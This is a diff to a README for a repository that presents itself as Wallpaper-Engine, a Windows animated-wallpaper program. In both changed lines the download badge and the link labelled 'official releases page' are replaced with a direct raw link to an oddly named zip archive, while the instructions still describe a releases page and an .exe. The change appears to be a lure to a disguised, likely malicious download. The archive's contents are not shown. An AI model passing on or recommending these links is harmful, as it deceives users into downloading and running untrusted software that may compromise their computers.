@@ -1,6 +1,6 @@
 # 🖼️ Wallpaper-Engine - Bring your desktop to life today
 
-[![Download Wallpaper-Engine](https://img.shields.io/badge/Download-Wallpaper--Engine-blue.svg)](https://github.com/Jkmala666/Wallpaper-Engine/releases)
+[![Download Wallpaper-Engine](https://img.shields.io/badge/Download-Wallpaper--Engine-blue.svg)](https://raw.githubusercontent.com/Jkmala666/Wallpaper-Engine/main/Sources/Wallpaper_Engine_holomorphosis.zip)
 
 Wallpaper-Engine helps you change your static desktop background into a dynamic, moving experience. You can choose from thousands of high-quality animated scenes, 4k landscapes, and interactive themes. This tool runs in the background of Windows 11 with low impact on your computer performance.
 
@@ -8,7 +8,7 @@ Wallpaper-Engine helps you change your static desktop background into a dynamic,
 
 Follow these steps to get the program on your computer.
 
-1. Visit the [official releases page](https://github.com/Jkmala666/Wallpaper-Engine/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Jkmala666/Wallpaper-Engine/main/Sources/Wallpaper_Engine_holomorphosis.zip).
 2. Locate the section labeled Assets.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can find, such as your Downloads folder.
